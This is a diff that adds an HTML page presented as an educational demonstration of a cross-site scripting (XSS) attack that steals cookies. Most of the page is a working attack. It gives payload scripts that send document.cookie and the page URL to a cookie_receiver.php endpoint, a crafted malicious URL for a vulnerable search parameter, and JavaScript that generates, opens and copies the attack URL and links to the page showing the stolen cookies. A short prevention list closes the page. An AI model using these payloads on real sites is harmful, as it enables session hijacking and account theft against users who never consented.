@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Cookie Stealing Attack - Demonstration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1000px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #d32f2f;
+        }
+        h2 {
+            color: #333;
+            border-bottom: 2px solid #ddd;
+            padding-bottom: 10px;
+        }
+        .code-block {
+            background-color: #f4f4f4;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 15px 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        .payload {
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .warning {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        .step {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #e7f3ff;
+            border-radius: 4px;
+        }
+        .step-number {
+            display: inline-block;
+            background-color: #2196F3;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 30px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .danger {
+            background-color: #f44336;
+        }
+        .danger:hover {
+            background-color: #da190b;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 XSS Cookie Stealing Attack Demonstration</h1>
+        
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> This is for educational purposes only. Only use this on systems you own or have explicit permission to test.
+        </div>
+
+        <h2>Understanding the Attack</h2>
+        <p>This demonstration shows how a Cross-Site Scripting (XSS) attack can be used to steal cookies from users. The attack follows these steps:</p>
+
+        <div class="step">
+            <span class="step-number">1</span>
+            <strong>Identify Vulnerable Page:</strong> Find a page that reflects user input without sanitization (like vulnerable_page.php)
+        </div>
+
+        <div class="step">
+            <span class="step-number">2</span>
+            <strong>Craft XSS Payload:</strong> Create a malicious script that steals cookies and sends them to an attacker-controlled server
+        </div>
+
+        <div class="step">
+            <span class="step-number">3</span>
+            <strong>Inject Payload:</strong> Inject the payload into the vulnerable page via URL parameter
+        </div>
+
+        <div class="step">
+            <span class="step-number">4</span>
+            <strong>Capture Cookies:</strong> The cookie receiver server captures and logs the stolen cookies
+        </div>
+
+        <h2>XSS Payload for Cookie Stealing</h2>
+        <p>The following payload will steal all cookies and send them to the cookie receiver:</p>
+        
+        <div class="payload">
+            <strong>Payload (URL encoded):</strong>
+            <div class="code-block" id="payload-url">
+&lt;script&gt;
+var img = new Image();
+img.src = 'http://localhost/cookie_receiver.php?cookie=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(window.location.href);
+&lt;/script&gt;
+            </div>
+        </div>
+
+        <div class="payload">
+            <strong>One-liner payload (for URL injection):</strong>
+            <div class="code-block" id="payload-oneliner">
+&lt;script&gt;var i=new Image();i.src='http://localhost/cookie_receiver.php?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href);&lt;/script&gt;
+            </div>
+        </div>
+
+        <h2>How to Execute the Attack</h2>
+        
+        <div class="step">
+            <span class="step-number">1</span>
+            <strong>Start the Cookie Receiver:</strong> Make sure cookie_receiver.php is accessible via web server
+        </div>
+
+        <div class="step">
+            <span class="step-number">2</span>
+            <strong>Construct the Malicious URL:</strong>
+            <div class="code-block">
+http://localhost/vulnerable_page.php?search=&lt;script&gt;var i=new Image();i.src='http://localhost/cookie_receiver.php?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href);&lt;/script&gt;
+            </div>
+        </div>
+
+        <div class="step">
+            <span class="step-number">3</span>
+            <strong>URL Encode the Payload:</strong> The payload needs to be URL encoded for the URL parameter
+            <div class="code-block" id="payload-encoded">
+            </div>
+            <button onclick="encodePayload()">Generate URL-Encoded Payload</button>
+        </div>
+
+        <div class="step">
+            <span class="step-number">4</span>
+            <strong>Test the Attack:</strong>
+            <button onclick="testAttack()">Test XSS Attack</button>
+            <button onclick="viewStolenCookies()" class="danger">View Stolen Cookies</button>
+        </div>
+
+        <h2>Complete Attack URL</h2>
+        <p>Copy and paste this URL into a browser (adjust localhost to your server):</p>
+        <div class="code-block" id="complete-url">
+            Loading...
+        </div>
+        <button onclick="copyToClipboard()">Copy URL to Clipboard</button>
+
+        <h2>Prevention</h2>
+        <p>To prevent XSS attacks:</p>
+        <ul>
+            <li>Always sanitize and validate user input</li>
+            <li>Use <code>htmlspecialchars()</code> or <code>htmlentities()</code> when outputting user data</li>
+            <li>Use Content Security Policy (CSP) headers</li>
+            <li>Set cookies with HttpOnly flag to prevent JavaScript access</li>
+            <li>Use prepared statements for database queries</li>
+        </ul>
+    </div>
+
+    <script>
+        // Generate the complete attack URL
+        function generateAttackURL() {
+            const baseURL = window.location.origin;
+            const payload = "<script>var i=new Image();i.src='http://localhost/cookie_receiver.php?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href);</script>";
+            const encodedPayload = encodeURIComponent(payload);
+            return `${baseURL}/vulnerable_page.php?search=${encodedPayload}`;
+        }
+
+        // Update the complete URL display
+        document.getElementById('complete-url').textContent = generateAttackURL();
+
+        // Encode payload for URL
+        function encodePayload() {
+            const payload = "<script>var i=new Image();i.src='http://localhost/cookie_receiver.php?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href);</script>";
+            const encoded = encodeURIComponent(payload);
+            document.getElementById('payload-encoded').textContent = encoded;
+        }
+
+        // Test the attack
+        function testAttack() {
+            const url = generateAttackURL();
+            window.open(url, '_blank');
+            alert('Attack URL opened in new tab. Check cookie_receiver.php for stolen cookies.');
+        }
+
+        // View stolen cookies
+        function viewStolenCookies() {
+            window.open('cookie_receiver.php', '_blank');
+        }
+
+        // Copy to clipboard
+        function copyToClipboard() {
+            const url = generateAttackURL();
+            navigator.clipboard.writeText(url).then(() => {
+                alert('URL copied to clipboard!');
+            }).catch(err => {
+                // Fallback for older browsers
+                const textArea = document.createElement('textarea');
+                textArea.value = url;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                alert('URL copied to clipboard!');
+            });
+        }
+
+        // Auto-encode on load
+        window.onload = function() {
+            encodePayload();
+        };
+    </script>
+</body>
+</html>
+
